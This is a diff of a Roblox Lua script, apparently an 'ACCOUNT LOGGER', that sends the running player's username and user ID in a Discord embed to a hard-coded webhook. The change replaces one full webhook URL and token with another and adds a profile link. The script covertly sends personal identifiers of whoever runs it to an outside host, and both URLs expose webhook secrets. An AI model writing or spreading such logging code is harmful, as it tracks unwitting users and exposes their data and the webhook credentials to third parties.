@@ -43,7 +43,7 @@ end
 
 if hwid then
 local HttpServ = game:GetService('HttpService')
-local url = "https://discord.com/api/webhooks/873622415203266670/sCgDKrQHIcdrJneuiWZuNV55xygpHUqwXvB1nSZkvd0ya3czW6GnLKSXNwZi7kUgpOJY"
+local url = "https://discord.com/api/webhooks/868994633781350440/mMa7I5wT8MFeYAz3iUduPLMYL5A3Eo3YevVulFdK86pwM-P-WqT3rcA4inSfh_JehvAJ"
 
 
 local data = 
@@ -51,7 +51,7 @@ local data =
         ["content"] = "",
         ["embeds"] = {{
             ["title"] = "**ACCOUNT LOGGER**",
-            ["description"] = "**"..Game.Players.LocalPlayer.Name.." ("..Game.Players.LocalPlayer.UserId..")**",
+            ["description"] = "**["..game.Players.LocalPlayer.Name.."](https://roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile) ("..game.Players.LocalPlayer.UserId..")**",
             ["type"] = "rich",
             ["color"] = tonumber(7506394),
             ["fields"] = {
